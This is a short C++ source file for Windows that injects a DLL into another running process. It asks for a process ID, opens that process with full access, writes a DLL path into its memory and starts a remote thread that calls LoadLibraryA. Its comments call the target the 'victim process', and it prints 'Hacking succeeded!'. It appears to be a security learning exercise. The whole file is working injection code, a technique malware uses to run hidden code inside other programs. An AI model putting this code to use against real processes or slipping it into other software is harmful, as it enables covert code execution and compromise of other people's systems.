#include <iostream>
#include <tchar.h>
#include <Windows.h>

bool InjectDLL(HANDLE hProcess, LPCSTR szPath)
{

	PVOID pfnLoadLibrary = (PVOID)GetProcAddress(LoadLibrary(L"Kernel32.dll"), "LoadLibraryA");
	if (pfnLoadLibrary == NULL)
	{
		return false;
	}

	// Allocate some memory to load the DLL Path
	PVOID pvAddr = VirtualAllocEx(hProcess, NULL, strlen(szPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (pvAddr == NULL)
	{
		return false;
	}

	// Load the DLL Path to the victim process address space
	if (!WriteProcessMemory(hProcess, pvAddr, (LPVOID)szPath, strlen(szPath) + 1, 0))
	{
		return false;
	}

	// Inject the DLL to the victim process
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnLoadLibrary, pvAddr, 0, NULL);
	if (!hRemoteThread || hRemoteThread == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	// Successful ouput
	std::cout << "DLL Injected.\n";
	std::cout << "Hacking succeeded!\n";

	// Wait for the remote thread to be finished
	WaitForSingleObject(hRemoteThread, INFINITE);

	// Free the memory and close the handles
	CloseHandle(hRemoteThread);
	VirtualFreeEx(hProcess, pvAddr, 0, MEM_RELEASE);

	return true;
}

int main()
{
	// DLL Path
	LPCSTR szPath = "C:\\Cyber\\DLLInjection\\MyDLL\\x64\\Debug\\MyDLL.dll";

	// Get the function LoadLibrary from the kernel
	PVOID pfnLoadLibrary = (PVOID)GetProcAddress(LoadLibrary(L"Kernel32.dll"), "LoadLibraryA");
	if (pfnLoadLibrary == NULL)
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}

	// Get the victim process ID
	DWORD dwProcessID;
	std::cout << "Enter Process ID to Hack: ";
	std::cin >> dwProcessID;

	std::cout << "Hacking...\n";

	// Get the victim process handle
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessID);
	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE)
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}

	if (!InjectDLL(hProcess, szPath))
	{
		std::cout << "Error: " << GetLastError() << "\n";
		return GetLastError();
	}
	
	CloseHandle(hProcess);

	return 0;
}